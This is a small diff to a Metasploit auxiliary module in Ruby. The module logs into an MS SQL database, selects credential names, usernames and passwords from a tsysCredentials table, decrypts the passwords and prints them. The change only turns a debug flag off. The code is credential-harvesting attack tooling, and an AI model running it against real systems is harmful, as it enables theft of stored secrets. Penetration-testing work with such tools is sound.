@@ -105,7 +105,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     result = mssql_query('select Credname, Username, Password from ' + datastore['DATABASE'] +
-    '.dbo.tsysCredentials WHERE LEN(Password)>64', true) if mssql_login_datastore
+    '.dbo.tsysCredentials WHERE LEN(Password)>64', false) if mssql_login_datastore
     result[:rows].each do |row|
       print_good("Credential name: #{row[0]} | username: #{row[1]} | password: #{lswdecrypt(row[2])} ")
     end
